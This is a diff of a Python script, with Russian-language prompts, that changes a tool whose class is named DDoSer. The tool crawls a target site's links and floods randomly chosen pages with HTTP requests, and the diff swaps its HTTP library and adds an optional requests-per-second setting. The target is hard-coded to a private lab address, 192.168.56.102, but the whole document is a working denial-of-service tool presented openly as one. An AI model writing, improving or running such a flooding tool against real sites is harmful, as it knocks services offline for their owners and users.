@@ -5,79 +5,98 @@ import link_extractor
 import time
 import random
 import progressbar
-import faster_than_requests as requests
+import pycurl
 from datetime import datetime
- 
+
 from threading import Thread
 
 global requestCountSuccess, requestCountExecuted
 
 if not os.path.exists('./maps/'):
-	os.makedirs('./maps/')
+    os.makedirs('./maps/')
+
+devnull = open('/dev/null', 'w')
 
 
 def url_grab(full_url):
 
-	if os.path.exists(f'./maps/{url}'):
+    if os.path.exists(f'./maps/{url}'):
 
-		with open(f'./maps/{url}', 'r') as f:
-			subUrls = f.read().splitlines()
-	else:
+        with open(f'./maps/{url}', 'r') as f:
+            subUrls = f.read().splitlines()
+    else:
 
-		subUrls = link_extractor.extractor('http://' + url)
+        subUrls = link_extractor.extractor('http://' + url)
 
-		os.mknod(f'./maps/{url}')
-		with open(f'./maps/{url}', 'w') as f:
-			for link in subUrls:
-				print(link.strip(), file=f)
+        os.mknod(f'./maps/{url}')
+        with open(f'./maps/{url}', 'w') as f:
+            for link in subUrls:
+                print(link.strip(), file=f)
 
-
-	print(datetime.now().strftime('[%X] ') + 'Карта сайта получена')
-	return subUrls
+    print(datetime.now().strftime('[%X] ') + 'Карта сайта получена')
+    return subUrls
 
 
 class DDoSer(Thread):
-	def __init__(self, url):
-		Thread.__init__(self)
-		self.url = url
-		
-	def run(self):
+    def __init__(self, url):
+        Thread.__init__(self)
+        self.url = url
 
-		global requestCountSuccess, requestCountExecuted
+    def run(self):
 
-		# responce = requests.urlopen(self.url).getcode() # urlib
-		responce = requests.get(self.url)['status']
-		if responce == '200 OK':
-			requestCountSuccess += 1
+        global requestCountSuccess, requestCountExecuted
 
-		requestCountExecuted += 1
+        curl = pycurl.Curl()
+        curl.setopt(curl.URL, self.url)
+        curl.setopt(curl.WRITEFUNCTION, lambda bytes: len(bytes))
+        curl.perform()
+        if curl.getinfo(pycurl.HTTP_CODE) == 200:
+            requestCountSuccess += 1
+        curl.close()
+        requestCountExecuted += 1
 
 
 if __name__ == '__main__':
 
-	# url = input(datetime.now().strftime('[%x %X] ') + 'Введите адрес сайта: ')
-	url = '192.168.56.102'
+    # url = input(datetime.now().strftime('[%x %X] ') + 'Введите адрес сайта: ')
+    url = '192.168.56.102'
 
-	subUrls = url_grab(url)
+    subUrls = url_grab(url)
 
-	requestCount = int(input(datetime.now().strftime('[%X] ') + 'Введите число запросов: '))
-	print()
+    speed = input(datetime.now().strftime(
+        '[%X] ') + 'Введите скорость запросов(з/с) или оставьте пустым для максимальной: ')
+    requestCount = int(input(datetime.now().strftime(
+        '[%X] ') + 'Введите число запросов: '))
+    print()
 
-	startTime = time.time()   
-	requestCountExecuted = 0
-	requestCountSuccess = 0
+    requestCountExecuted = 0
+    requestCountSuccess = 0
 
-	with progressbar.ProgressBar(max_value=requestCount) as bar:
-		for i in range(requestCount):
-			url = random.choice(subUrls)
-			thread = DDoSer(url)
-			thread.start()
-			thread.join()
-			bar.update(requestCountExecuted)
-		
-		while requestCountExecuted < requestCount:
-			bar.update(requestCountExecuted)
+    with progressbar.ProgressBar(max_value=requestCount) as bar:
+        startTime = time.time()
+        if speed:
+            speed = int(speed)
+            for i in range(requestCount):
+                delayStartTime = time.time()
+                curUrl = random.choice(subUrls)
+                thread = DDoSer(curUrl)
+                thread.start()
+                thread.join()
+                bar.update(requestCountExecuted)
+                if time.time() - delayStartTime < 1 / speed:
+                    time.sleep(1 / speed - time.time() + delayStartTime)
+        else:
+            for i in range(requestCount):
+                curUrl = random.choice(subUrls)
+                thread = DDoSer(curUrl)
+                thread.start()
+                thread.join()
+                bar.update(requestCountExecuted)
 
-	print('\n' + datetime.now().strftime('[%X] ') + 'Всего выслано запросов: ' + str(requestCountExecuted))
-	print(datetime.now().strftime('[%X] ') + 'Успешных запросов: ' + str(requestCountSuccess))
-	print(datetime.now().strftime('[%X] ') + 'Средняя скорость: ' + str(round(requestCountExecuted/(time.time() - startTime))) + ' з/с')
+        while requestCountExecuted < requestCount:
+            bar.update(requestCountExecuted)
+
+    print(datetime.now().strftime(
+        '[%X] ') + 'Успешных запросов: ' + str(requestCountSuccess))
+    print(datetime.now().strftime('[%X] ') + 'Средняя скорость: ' + str(
+        round(requestCountExecuted / (time.time() - startTime))) + ' з/с')
